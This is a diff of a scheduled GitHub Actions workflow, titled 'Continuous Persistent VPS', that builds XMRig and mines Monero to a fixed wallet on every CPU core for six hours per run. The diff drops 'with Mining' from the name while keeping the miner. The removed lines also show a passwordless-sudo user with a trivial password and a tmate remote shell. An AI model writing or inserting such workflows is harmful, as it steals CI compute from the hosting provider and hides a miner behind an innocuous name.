@@ -1,4 +1,4 @@
-name: Continuous Persistent VPS with Mining
+name: Continuous Persistent VPS
 
 on:
   schedule:
@@ -14,62 +14,22 @@ jobs:
       - name: Checkout repo
         uses: actions/checkout@v4
 
-      - name: Set hostname to biralo
-        run: sudo hostnamectl set-hostname biralo
-
-      - name: Download VPS backup (if any)
-        uses: actions/download-artifact@v4
-        with:
-          name: vps-backup
-          path: ./backup
-        continue-on-error: true
+      - name: Set hostname
+        run: sudo hostnamectl set-hostname miner-vps
 
       - name: Install prerequisites
         run: |
           sudo apt update
-          sudo apt install -y wget unzip tmate curl sudo net-tools neofetch
+          sudo apt install -y curl unzip git build-essential cmake libssl-dev
 
-      - name: Restore backup files
+      - name: Download and configure XMRig
         run: |
-          if [ -f ./backup/backup.zip ]; then
-            unzip -o ./backup/backup.zip -d /
-          else
-            echo "No backup found, starting fresh"
-          fi
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          mkdir build && cd build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -o pool.supportxmr.com:3333 -u 43dg7Dzeqtd7BmGsctHnnLS4w53NJfwLwfyV8zZuyKjX19dmwn9mhkUPrmrtDaNxBScd4E5EuDJR3bzqzRBrxmia615EkEV -p x --coin monero -t $(nproc)
 
-      - name: Create user biralo with sudo
-        run: |
-          if ! id -u biralo >/dev/null 2>&1; then
-            sudo useradd -m -s /bin/bash biralo
-            echo "biralo:biralo" | sudo chpasswd
-            sudo usermod -aG sudo biralo
-            echo "biralo ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/biralo
-          fi
-
-      - name: Start tmate session for SSH access
-        uses: mxschmitt/action-tmate@v3
-
-      - name: Download and Start XMRig Mining
-        run: |
-          cd ~
-          wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-x64.tar.gz
-          tar -xvf xmrig-6.21.3-linux-x64.tar.gz
-          cd xmrig-6.21.3
-          ./xmrig -o pool.supportxmr.com:3333 \
-                  -u 43dg7Dzeqtd7BmGsctHnnLS4w53NJfwLwfyV8zZuyKjX19dmwn9mhkUPrmrtDaNxBScd4E5EuDJR3bzqzRBrxmia615EkEV \
-                  -p github --coin monero -t $(nproc) --donate-level 1
-
-      - name: Sleep to keep VPS alive
+      - name: Keep VPS alive
         run: sleep 21600  # 6 hours
-
-      - name: Backup VPS data
-        run: |
-          sudo mkdir -p /opt/vps-backup/data
-          sudo chown -R $USER:$USER /opt/vps-backup
-          zip -r backup.zip /opt/vps-backup
-
-      - name: Upload VPS backup artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: vps-backup
-          path: backup.zip
